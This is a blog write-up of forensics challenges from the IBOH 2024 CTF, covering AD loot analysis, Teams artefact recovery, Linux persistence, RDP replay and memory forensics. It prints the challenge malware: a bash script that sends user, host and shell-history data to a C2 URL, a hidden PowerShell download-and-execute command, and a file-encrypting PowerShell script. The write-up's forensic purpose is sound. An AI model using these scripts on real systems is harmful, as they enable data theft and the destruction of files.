---
title: IBOH CTF 2024 (Local Category) - Writeups
time: 2024-09-28 12:00:00
categories: [ctf]
tags: [forensics,local]
---

This is a writeup for all forensics challenges from IBOH 2024 (Local Category). Being the backseat gamer I am, I went ahead and attempted Zach's challenges and made a quick writeup for it since nobody has done so currently.

## New Hire [Forensics]
Question: After the intern left and was arrested for hacking his previous company, the company has finally decided to take in new hires! What could go wrong? Oh no, the company was hacked again! We have gathered evidence from the attacker’s machine!

Flag: `IBOH24{AD_PWN3d_L1ke_OscP_@gAiN}`

We are given files that seems to be output of an Active Directory (AD) enumeration tool.

```
└─$ tree kali 
kali
├── loot
│   └── Groups.xml
└── recon
    ├── 20240815030319_computers.json
    ├── 20240815030319_containers.json
    ├── 20240815030319_domains.json
    ├── 20240815030319_gpos.json
    ├── 20240815030319_groups.json
    ├── 20240815030319_ous.json
    └── 20240815030319_users.json

3 directories, 8 files
```

Analyzing the `Groups.xml` file revealed an encrypted password for a user named 'rgraham'. However, Microsoft made an oppsie and made the encryption key publicly available, allowing anyone to decrypt these passwords stored in the file. One easy way to decrypt this was to utilise a tool called gpp-decrypt, where the 2nd part of the flag can be identified.

```
└─$ python3 gpp-decrypt.py -f ~/Desktop/shared/kali/loot/Groups.xml
/home/kali/Desktop/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence '\ '
  banner = '''

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: rgraham
[ * ] Password: L1ke_OscP_@gAiN}
```

To find the 1st part of the flag, I had to check each json file manually and a long base64 encoded string can be identified in the `20240815030319_users.json` file.

![newhire1](/assets/posts/ibohctf2024/newhire1.png)

```
┌──(myenv)─(kali㉿kali)-[~/Desktop/gpp-decrypt]
└─$ echo "VwBlACAAZABpAGQAbgAnAHQAIABsAGUAYQByAG4AIABvAHUAcgAgAGwAZQBzAHMAbwBuACAAcwBvACAAdABoAGkAcwAgAGkAcwAgAG8AbgBlACAAaABhAGwAZgAgAG8AZgAgAHQAaABlACAAZgBsAGEAZwA6ACAASQBCAE8ASAAyADQAewBBAEQAXwBQAFcATgAzAGQAXwA=" | base64 -d
We didn't learn our lesson so this is one half of the flag: IBOH24{AD_PWN3d_                                                                                                                                          
```

## Help Me in Assignment [Forensics]
Question: 

Flag: `IBOH24{w3lcomE_70_My_Cl45s}`

We are given an AD1 image to investigate. Analyzing it, we stumble upon a DOC file in the Desktop folder where it mentioned something about messaging lecturer in MS Teams.

![assign1](/assets/posts/ibohctf2024/assign1.png)

![assign2](/assets/posts/ibohctf2024/assign2.png)

Here, many players seem to struggle since certain MS Teams artifacts weren't present in the AD1 image, including `C:\Users\XXX\AppData\Local\Microsoft\Teams` and `C:\Users\XXX\AppData\Roaming\Microsoft\Teams`. Doing research online, this [blog](https://www.alexbilz.com/post/2021-09-09-forensic-artifacts-microsoft-teams/) mentioned that there is actually another location where MS Teams messages can be recovered which was the IndexDB file.

> Even if you are not interested in the nitty-gritty details of the LevelDB databases, you should know that LevelDB databases use an append log that contains data for storing the most recent transactions that can grow up to a size of 4 MB. Once the .log file has reached its maximum size, the records get deduplicated and compressed into one or more higher level ldb files. This detail is crucial as this step increases the entropy makes string searches highly ineffective for the higher level files.

Hence, we can use a parsing tool from [forensicsim] to essentially beutify the IndexDB file located in `C:\Users\heehe\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\Default\IndexedDB\https_teams.live.com_0.indexeddb.leveldb\`.

![assign3](/assets/posts/ibohctf2024/assign3.png)

![assign4](/assets/posts/ibohctf2024/assign4.png)

```
└─$ echo "SUJPSDI0e3czbGNvbUVfNzBfTXlfQ2w0NXN9" | base64 -d
IBOH24{w3lcomE_70_My_Cl45s}
```

## Fallout [Forensics]
Question: As part of Vault 181’s experiment, a vault was filled with 100 people, accompanied with 100 laptops. Vault Tech wanted to observe the activities of the vault dwellers, so they installed backdoors through several persistence techniques.

Flag: `IBOH24{pers1sT3NC3_i5_Futi1e}`

We are given an E01 image to investigate. Analyzing it, we stumble upon a Linux system where a potential backdoor was supposedly placed by the malware for persistence (I hate Linux forensics). Checking out the home directory, the bash history seems to be empty, most likely wiped by the malware to remain hidden.

![fall2](/assets/posts/ibohctf2024/fall2.png)

Busting out my Linux persistence sheet, I analyzed common directories that are used for persistence like` cron`. Here, a suspicious CRON job can be identified which seem to be collecting and submiting anonymized statistics about installed software on a system.

![fall1](/assets/posts/ibohctf2024/fall1.png)

![fall3](/assets/posts/ibohctf2024/fall3.png)

Checking out the `init.d`, another suspicious shell script can be identified that seem to be managing the download of 2 encrypted files after the system obtains an IP address on the specified network interface. However, we still have no idea how the encryption was done to reverse it.

![fall4](/assets/posts/ibohctf2024/fall4.png)

Finally, the `systemd` directory provides another URL, this time it shows the full encryption process. Seems like a script that was decrypting the private key file and also the encrypted file identified previously from `init.d`.

![fall5](/assets/posts/ibohctf2024/fall5.png)

```
└─$ curl -s https://gist.githubusercontent.com/zachwong02/a5856cf57578da36179b920615d3e154/raw/491aee2c3edb262f4ad22852ba5dd41223b5e203/ubuntu_update
#/bin/bash

openssl rsautl -decrypt -inkey /home/vaultboy/.ssh/private_key.pem -in /tmp/ubuntu_license.zip -out /tmp/ubuntu_license
openssl enc -d -aes-256-cbc -in /tmp/ubuntu_update.sh.zip -pass file:/tmp/ubuntu_license | bash

rm /tmp/ubuntu_license.zip /tmp/ubuntu_license /tmp/ubuntu_update.sh.zip
```

At this point, just dump the encrypted files from `/tmp` and perform what the script is doing to obtain the flag.

```
└─$ openssl rsautl -decrypt -inkey private_key.pem -in ubuntu_license.zip -out ubuntu_license      
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
                                                                                                                                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/shared]
└─$ openssl enc -d -aes-256-cbc -in ubuntu_update.sh.zip -pass file:ubuntu_license       
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
#!/bin/bash

# Define the server URL
SERVER_URL="http://192.168.138.128/c2"

# Collect the output of the commands
USERNAME=$(whoami)
HOSTNAME=$(hostname)
IFCONFIG=$(ifconfig)
BASH_HISTORY=$(cat ~/.bash_history)

# Create the data to be sent
DATA=$(cat <<EOF
{
    "username": "$USERNAME",
    "hostname": "$HOSTNAME",
    "ifconfig": "$IFCONFIG",
    "bash_history": "$BASH_HISTORY"
    "flag": IBOH24{pers1sT3NC3_i5_Futi1e}
}
EOF
)

# Send the POST request
curl -X POST -H "Content-Type: application/json" -d "$DATA" $SERVER_URL
```

## SCP 6.0 [Forensics]
Question: SITE-[REDACTED] has been breached by the Chaos Insurgency. Luckily, the network traffic has been captured by the SCP Foundation so that they will live up to their motto. Secure. Contain. Protect.

Flag: `IBOH24{H0neyPOt_W1TH_MiTm_mOnIt0riNG}`

We are given a PCAP and SSL key log file to investigate. Another day another SCP challenge from Zach. After decrypting the TLS packets with the SSL key log file given, several RDP packets can be identified with other protocols that look foreign to me. Doing some research online, this [blog](https://www.cyberark.com/resources/threat-research-blog/explain-like-i-m-5-remote-desktop-protocol-rdp) mentioned the protocols being utilised together with RDP to facilitate a proper exchange of information between the local machine and RDP server. 

![scp1](/assets/posts/ibohctf2024/scp1.png)

Since we are already given a key to decrypt the TLS packets, the only way to actually obtain a flag from this seem to be replaying the RDP session. There aren't many blogs about this but here is [one](https://gosecure.ai/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/) of them that really explains it well. There were some issues when using the PyRDP tool but I managed to somehow make it work. First, we have to export the RDP packets from the PCAP, this can be done by exporting the PDU to a new PCAP file.

![scp2](/assets/posts/ibohctf2024/scp2.png)

After saving the new PCAP file (MUST BE PCAP, NOT PCAPNG), the tool can be used to convert it to visualized format to view the recording of the RDP session.

![scp3](/assets/posts/ibohctf2024/scp3.png)

```                                                                                                                                 
┌──(myenv)─(kali㉿kali)-[~/Desktop/gpp-decrypt]
└─$ pyrdp-convert -s ~/Desktop/shared/dist/ssl.log -o ~/Desktop ~/Desktop/shared/dist/captureout.pcap
[*] Analyzing PCAP '/home/kali/Desktop/shared/dist/captureout.pcap' ...
    - 192.168.163.159:49772 -> 192.168.163.148:3389 : plaintext
    - 192.168.163.148:44186 -> 192.168.163.158:3389 : plaintext
[*] Processing 192.168.163.159:49772 -> 192.168.163.148:3389
100% (961 of 961) |#################################################################################| Elapsed Time: 0:00:00 Time:  0:00:00

[+] Successfully wrote '/home/kali/Desktop/20240815113311_192.168.163.159:49772-192.168.163.148:3389.pyrdp'
[*] Processing 192.168.163.148:44186 -> 192.168.163.158:3389
100% (1018 of 1018) |###############################################################################| Elapsed Time: 0:00:00 Time:  0:00:00

[+] Successfully wrote '/home/kali/Desktop/20240815113311_192.168.163.148:44186-192.168.163.158:3389.pyrdp'
                                                                                                                                           
┌──(myenv)─(kali㉿kali)-[~/Desktop/gpp-decrypt]
└─$ pyrdp-player
```

![output](/assets/posts/ibohctf2024/output.gif)

## Malmon [Forensics]
Question: Our malware analyst has recently come across a malware sample which is not zipped and he accidentally executed the sample causing the malware to escape!

Flag: `IBOH24{6Otta_cA7CH_tHem_A11!}`

We are given a memory dump and some encrypted files to investigate. Analyzing the processes, we can identify a suspicious program executing powershell and other system processes. 

```
└─$ python3 vol.py -f ~/Desktop/shared/Malmon/malmon.raw windows.pstree                                     
Volatility 3 Framework 2.10.0
Progress:  100.00               PDB scanning finished                          
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path

---SNIP---

** 4360 4284    explorer.exe    0x9a0a6ff18300  78      -       1       False   2024-09-21 15:00:47.000000 UTC  N/A     \Device\HarddiskVolume4\Windows\explorer.exe    C:\Windows\Explorer.EXE      C:\Windows\Explorer.EXE
*** 6596        4360    SecurityHealth  0x9a0a75668340  5       -       1       False   2024-09-21 15:00:59.000000 UTC  N/A     \Device\HarddiskVolume4\Windows\System32\SecurityHealthSystray.exe   "C:\Windows\System32\SecurityHealthSystray.exe"         C:\Windows\System32\SecurityHealthSystray.exe
*** 6920        4360    OneDrive.exe    0x9a0a753343c0  26      -       1       True    2024-09-21 15:01:00.000000 UTC  N/A     \Device\HarddiskVolume4\Users\admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe    "C:\Users\admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background      C:\Users\admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe
*** 2668        4360    vmtoolsd.exe    0x9a0a7532e380  11      -       1       False   2024-09-21 15:00:59.000000 UTC  N/A     \Device\HarddiskVolume4\Program Files\VMware\VMware Tools\vmtoolsd.exe       "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr    C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
*** 8372        4360    MRCv120.exe     0x9a0a758e40c0  17      -       1       True    2024-09-21 15:02:49.000000 UTC  N/A     \Device\HarddiskVolume5\MRCv120.exe     "E:\MRCv120.exe"     E:\MRCv120.exe
*** 3284        4360    malmon.exe      0x9a0a743b0080  8       -       1       True    2024-09-21 15:01:45.000000 UTC  N/A     \Device\HarddiskVolume4\Users\admin\Desktop\malmon.exe       "C:\Users\admin\Desktop\malmon.exe"     C:\Users\admin\Desktop\malmon.exe
**** 6816       3284    conhost.exe     0x9a0a75640080  7       -       1       False   2024-09-21 15:01:45.000000 UTC  N/A     \Device\HarddiskVolume4\Windows\System32\conhost.exe\??\C:\Windows\system32\conhost.exe 0x4  C:\Windows\system32\conhost.exe
**** 5532       3284    powershell.exe  0x9a0a75905080  15      -       1       True    2024-09-21 15:01:46.000000 UTC  N/A     \Device\HarddiskVolume4\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe       "powershell"    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
***** 1104      5532    conhost.exe     0x9a0a75953080  3       -       1       False   2024-09-21 15:01:46.000000 UTC  N/A     \Device\HarddiskVolume4\Windows\System32\conhost.exe\??\C:\Windows\system32\conhost.exe 0x4  C:\Windows\system32\conhost.exe

---SNIP---
```

Since it was executing powershell, I went ahead and dumped the malware to run strings on it to potentially identify the malicious powershell commands.

```
└─$ strings pid.3284.dmp | grep powershell      
powershell.exe -exec bypass -NoP -NonI -W Hidden -c "iwr https://gist.githubusercontent.com/zachwong02/40b6b4dd9b59081f539863f889b1ed95/raw/1f40b7d454300b70ade8a8c1e15f61c6509ffb06/microsoft_update.ps1 -UseBasicParsing | Select-Object -Expand Content | iex"
powershell.exe -exec bypass -NoP -NonI -W Hidden -c "iwr https://gist.githubusercontent.com/zachwong02/40b6b4dd9b59081f539863f889b1ed95/raw/1f40b7d454300b70ade8a8c1e15f61c6509ffb06/microsoft_update.ps1 -UseBasicParsing | Select-Object -Expand Content | iex"

---SNIP---
```

Lo and behold, an obfuscated powershell script can be obtained from the URL identified previously.

```powershell
└─$ curl -s https://gist.githubusercontent.com/zachwong02/40b6b4dd9b59081f539863f889b1ed95/raw/1f40b7d454300b70ade8a8c1e15f61c6509ffb06/microsoft_update.ps1
  sEt-ItEm  ('Va'+'r'+'iabLE:Y'+'fKSE2') (  [type]("{0}{2}{1}" -f 'CO','rT','nvE') )  ;   ${5`YN`Mz}=[tYPE]("{5}{3}{2}{1}{0}{6}{8}{4}{7}" -F 'r','c','ITy.','uR','a','sysTem.SeC','yPTOGr','eS','aphY.')  ;  ${0`sO}  =  [type]("{3}{7}{9}{4}{5}{2}{6}{10}{0}{1}{8}" -F'P','hy.C','.','SY','u','rITy','crYptOg','Ste','iPHErmODe','m.SEc','RA')  ;    SEt-itEM  VARiAblE:VFj4K  ([tyPe]("{0}{2}{1}{3}{4}" -f 'sy','.I','STEm','O.Fil','e') ) ;${VRLH`H`UxY`99} = ("{6}{5}{2}{0}{7}{4}{3}{1}"-f 'WQm6','zHo=','ZwHYuiK','FAp4dRa1RhW','ow1PfP/DNCo','t','6P9U','Nb')
${fQvX`Ep`kE`99} = ("{1}{4}{7}{6}{5}{2}{0}{3}" -f 'A','ml6e2HwOgw','RzXb','==','cf','D0s','s','7')
${b`BQiulC`U99} = ((("{6}{3}{1}{2}{5}{4}{0}{7}"-f 'top{0}importan','s{0','}a','{0}User','sk','dmin{0}De','C:','t'))  -f  [cHar]92)
if (-Not (.("{1}{0}"-f '-Path','Test') ${BBQ`Iu`lcU99})) {exit}
${LtJ`eQl`Kx99} = ("{1}{0}" -f '.doc','*'), ("{2}{0}{1}"-f 'c','x','*.do'), ("{1}{0}" -f 's','*.xl'), ("{0}{1}"-f '*.xls','m'), ("{0}{1}"-f'*','.pdf'), ("{0}{1}" -f'*','.txt')
function eXI`St {
    param ([string]${kCrB`VFu`Y99})
    
    ${C`oYMV`YdO99} =  ${Yfk`Se2}::("{0}{4}{3}{2}{1}"-f 'FromB','tring','S','4','ase6').Invoke(${VRlh`HUX`y99})
    ${O`HM`F`pKpA99} =   (Dir  ('VA'+'r'+'Iable:y'+'FksE2') ).vALUe::("{0}{4}{3}{1}{2}"-f'F','se64','String','omBa','r').Invoke(${FqvxEP`ke`99})
    ${eL`R`Vzypl99} =  ${VfJ`4K}::("{1}{2}{0}"-f'llBytes','Rea','dA').Invoke(${KC`R`BvFU`y99})
    ${UElQ`Tb`xg`99} =   (  ls  VARIAbLe:5ynmz ).vAluE::("{0}{1}{2}"-f'Cr','eat','e').Invoke()
    ${UElQt`B`x`g99}."K`eY" = ${c`oYm`Vydo`99}
    ${UeLQT`BxG`99}."IV" = ${OHmF`PK`Pa`99}
    ${uE`LQ`TbXg`99}."MO`DE" =   ${0`So}::"c`Bc"
    ${BAdm`w`NX`G99} = ${UElqT`Bx`G99}.("{0}{2}{1}{3}{4}"-f'Cr','ncr','eateE','ypt','or').Invoke()
    ${Ko`e`w`TRzK99} = ${b`ADMwnx`G`99}.("{1}{2}{3}{0}"-f'ock','Tra','nsformFina','lBl').Invoke(${ElRvz`yp`l99}, 0, ${eLRv`zYpL`99}."len`gTh")
     ${V`Fj4K}::("{0}{1}{2}{3}"-f 'W','r','iteAllByte','s').Invoke(${Kc`R`B`VFuy99}, ${K`OewTrZ`k99})
}
${W`qcK`N`Xml99} = ((("{3}{10}{5}{1}{7}{11}{8}{4}{2}{9}{0}{6}" -f 'o','Microso','r','HKCU:LXJ','entVe','J','nLXJRun','ftLXJW','Curr','si','SoftwareLX','indowsLXJ'))."R`EPlaCe"('LXJ',[sTrIng][cHaR]92))
${fHY`Hv`No`W99} = ("{1}{0}" -f 'g','fla')
${dzef`Ox`dP99} = &("{3}{5}{2}{4}{1}{0}" -f 'erty','mProp','t','G','-Ite','e') -Path ${W`Q`ck`NxmL99} -Name ${fhy`HVn`ow99} -ErrorAction ("{4}{1}{2}{3}{0}"-f'ue','en','tlyCo','ntin','Sil')
if (-Not ${dzE`F`ox`dp99}) {exit}
foreach (${fsXVd`l`TE99} in ${lt`j`Eq`lKx99}) {
    ${FI`leS} = .("{2}{1}{0}" -f 'ChildItem','-','Get') -Path ${b`BQIU`l`cU99} -Recurse -Filter ${fsX`VDLt`e`99}
    foreach (${F`ile} in ${f`i`LeS}) {.("{0}{1}" -f 'exis','t') -kCRbVFUY99 ${fi`LE}."FUlLna`ME"}
}
```

The powershell script seem to be a common obfuscation technique, so we can utilise PowerDecode to automate the deobfuscation process for us.

![malmon1](/assets/posts/ibohctf2024/malmon1.png)

```powershell
  sEt-ItEm  'VariabLE:YfKSE2' (  [type]'COnvErT' )  ;   ${5YNMz}=[tYPE]'sysTem.SeCuRITy.cryPTOGraphY.aeS'  ;  ${0sO}  =  [type]'SYStem.SEcurITy.crYptOgRAPhy.CiPHErmODe'  ;    SEt-itEM  VARiAblE:VFj4K  ([tyPe]'sySTEm.IO.File' ) ;${VRLHHUxY99} = '6P9UtZwHYuiKWQm6Nbow1PfP/DNCoFAp4dRa1RhWzHo='
${fQvXEpkE99} = 'ml6e2HwOgwcf7sD0sRzXbA=='
${bBQiulCU99} = (('C:{0}Users{0}admin{0}Desktop{0}important')  -f  '\')
if (-Not (Test-Path ${BBQIulcU99})) {exit}
${LtJeQlKx99} = '*.doc', '*.docx', '*.xls', '*.xlsm', '*.pdf', '*.txt'
function eXISt {
    param ([string]${kCrBVFuY99})

    ${CoYMVYdO99} =  ${YfkSe2}::'FromBase64String'.Invoke(${VRlhHUXy99})
    ${OHMFpKpA99} =   (Dir  'VArIable:yFksE2' ).vALUe::'FromBase64String'.Invoke(${FqvxEPke99})
    ${eLRVzypl99} =  ${VfJ4K}::'ReadAllBytes'.Invoke(${KCRBvFUy99})
    ${UElQTbxg99} =   (  ls  VARIAbLe:5ynmz ).vAluE::'Create'.Invoke()
    ${UElQtBxg99}.KeY = ${coYmVydo99}
    ${UeLQTBxG99}.IV = ${OHmFPKPa99}
    ${uELQTbXg99}.MODE =   ${0So}::"cBc"
    ${BAdmwNXG99} = ${UElqTBxG99}.CreateEncryptor.Invoke()
    ${KoewTRzK99} = ${bADMwnxG99}.TransformFinalBlock.Invoke(${ElRvzypl99}, 0, ${eLRvzYpL99}.lengTh)
     ${VFj4K}::'WriteAllBytes'.Invoke(${KcRBVFuy99}, ${KOewTrZk99})
}
${WqcKNXml99} = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
${fHYHvNoW99} = 'flag'
${dzefOxdP99} = Get-ItemProperty -Path ${WQckNxmL99} -Name ${fhyHVnow99} -ErrorAction 'SilentlyContinue'
if (-Not ${dzEFoxdp99}) {exit}
foreach (${fsXVdlTE99} in ${ltjEqlKx99}) {
    ${FIleS} = Get-ChildItem -Path ${bBQIUlcU99} -Recurse -Filter ${fsXVDLte99}
    foreach (${File} in ${fiLeS}) {exist -kCRbVFUY99 ${fiLE}.FUlLnaME}
}
```

Analyzing the script, this function tells us that the files were being encrypted with AES-CBC using the base64 key `6P9UtZwHYuiKWQm6Nbow1PfP/DNCoFAp4dRa1RhWzHo=` and base64 IV `'ml6e2HwOgwcf7sD0sRzXbA==`.

```powershell
function eXISt {
    param ([string]${kCrBVFuY99})

    ${CoYMVYdO99} =  ${YfkSe2}::'FromBase64String'.Invoke(${VRlhHUXy99})
    ${OHMFpKpA99} =   (Dir  'VArIable:yFksE2' ).vALUe::'FromBase64String'.Invoke(${FqvxEPke99})
    ${eLRVzypl99} =  ${VfJ4K}::'ReadAllBytes'.Invoke(${KCRBvFUy99})
    ${UElQTbxg99} =   (  ls  VARIAbLe:5ynmz ).vAluE::'Create'.Invoke()
    ${UElQtBxg99}.KeY = ${coYmVydo99}
    ${UeLQTBxG99}.IV = ${OHmFPKPa99}
    ${uELQTbXg99}.MODE =   ${0So}::"cBc"
    ${BAdmwNXG99} = ${UElqTBxG99}.CreateEncryptor.Invoke()
    ${KoewTRzK99} = ${bADMwnxG99}.TransformFinalBlock.Invoke(${ElRvzypl99}, 0, ${eLRvzYpL99}.lengTh)
     ${VFj4K}::'WriteAllBytes'.Invoke(${KcRBVFuy99}, ${KOewTrZk99})
}
```

Additionally, it seems that it was also encrypted again using the value of the `flag` key from the hive `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`.

```powershell
${WqcKNXml99} = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
${fHYHvNoW99} = 'flag'
${dzefOxdP99} = Get-ItemProperty -Path ${WQckNxmL99} -Name ${fhyHVnow99} -ErrorAction 'SilentlyContinue'
if (-Not ${dzEFoxdp99}) {exit}
foreach (${fsXVdlTE99} in ${ltjEqlKx99}) {
    ${FIleS} = Get-ChildItem -Path ${bBQIUlcU99} -Recurse -Filter ${fsXVDLte99}
    foreach (${File} in ${fiLeS}) {exist -kCRbVFUY99 ${fiLE}.FUlLnaME}
}
```

So we have to dump the user registry too to analyze the key value.

```
└─$ python3 vol.py -f ~/Desktop/shared/Malmon/malmon.raw windows.filescan | grep -iE ntuser.dat                     
0x9a0a737b80c0.0\Windows\ServiceProfiles\NetworkService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
0x9a0a737b8250  \Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0x9a0a737b83e0  \Windows\ServiceProfiles\NetworkService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
0x9a0a737b8570  \Windows\ServiceProfiles\NetworkService\NTUSER.DAT.LOG2
0x9a0a737b8bb0  \Windows\ServiceProfiles\NetworkService\NTUSER.DAT.LOG1
0x9a0a737b8ed0  \Windows\ServiceProfiles\NetworkService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
0x9a0a737bb700  \Device\HarddiskVolume4\Windows\ServiceProfiles\NetworkService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM
0x9a0a737bb890  \Device\HarddiskVolume4\Windows\ServiceProfiles\NetworkService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM
0x9a0a73eebd40  \Device\HarddiskVolume4\Windows\ServiceProfiles\LocalService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM
0x9a0a73eef250  \Windows\ServiceProfiles\LocalService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
0x9a0a73eef3e0  \Windows\ServiceProfiles\LocalService\NTUSER.DAT
0x9a0a73eef570  \Windows\ServiceProfiles\LocalService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
0x9a0a73eef700  \Windows\ServiceProfiles\LocalService\NTUSER.DAT.LOG2
0x9a0a73eefa20  \Device\HarddiskVolume4\Windows\ServiceProfiles\LocalService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM
0x9a0a73eefbb0  \Windows\ServiceProfiles\LocalService\NTUSER.DAT.LOG1
0x9a0a73eefd40  \Windows\ServiceProfiles\LocalService\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
0x9a0a743ff570  \Users\admin\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
0x9a0a7441e250  \Users\admin\NTUSER.DAT
0x9a0a7441e3e0  \Users\admin\ntuser.dat.LOG1
0x9a0a7441e570  \Users\admin\ntuser.dat.LOG2
0x9a0a7441ebb0  \Users\admin\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
0x9a0a744260c0  \Users\admin\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
0x9a0a74426700  \Device\HarddiskVolume4\Users\admin\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM
0x9a0a74426a20  \Device\HarddiskVolume4\Users\admin\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM

└─$ python3 vol.py -f ~/Desktop/shared/Malmon/malmon.raw -o ~/Desktop/shared/Malmon windows.dumpfiles --virtaddr 0x9a0a7441e250
Volatility 3 Framework 2.10.0
Progress:  100.00               PDB scanning finished                          
Cache   FileObject      FileName        Result

DataSectionObject       0x9a0a7441e250  NTUSER.DAT      file.0x9a0a7441e250.0x9a0a7441b2d0.DataSectionObject.NTUSER.DAT.dat
SharedCacheMap  0x9a0a7441e250  NTUSER.DAT      Error dumping file
```

![malmon2](/assets/posts/ibohctf2024/malmon2.png)

The flag can be obtained after decrypting the `malmon.pdf` file twice.

![malmon3](/assets/posts/ibohctf2024/malmon3.png)

![malmon4](/assets/posts/ibohctf2024/malmon4.png)
